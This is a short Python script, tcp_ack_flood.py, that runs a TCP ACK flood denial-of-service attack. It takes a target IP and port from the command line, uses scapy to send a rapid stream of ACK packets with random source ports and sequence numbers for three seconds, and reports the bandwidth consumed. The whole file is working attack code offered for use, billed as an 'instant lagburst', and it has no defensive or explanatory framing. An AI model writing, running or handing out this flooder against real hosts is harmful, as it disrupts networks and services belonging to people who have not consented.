# tcp_ack_flood.py — Instant lagburst with TCP ACK attack
import random
import time
import sys
from scapy.all import IP, TCP, send
import threading
import psutil

# === CONFIGURATION ===
DURATION = 3  # seconds
PAYLOAD_SIZE = 1400  # not sent, just affects window size

# === BANDWIDTH MONITOR ===
def monitor_bandwidth():
    net = psutil.net_io_counters()
    start = net.bytes_sent
    time.sleep(DURATION)
    end = psutil.net_io_counters().bytes_sent
    kbps = ((end - start) * 8) / 1000
    print(f"[+] Bandwidth used during flood: {kbps:.2f} kbps")

# === FLOOD FUNCTION ===
def tcp_ack_flood(target_ip, target_port):
    print(f"[+] Launching TCP ACK flood on {target_ip}:{target_port} for {DURATION}s...")
    threading.Thread(target=monitor_bandwidth).start()
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            pkt = IP(dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=int(target_port), flags="A", seq=random.randint(0, 4294967295))
            send(pkt, verbose=0)
        except Exception as e:
            print(f"[!] TCP Error: {e}")
    print("[+] TCP ACK flood complete.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 tcp_ack_flood.py <target_ip> <target_port>")
        sys.exit(1)
    tcp_ack_flood(sys.argv[1], sys.argv[2])
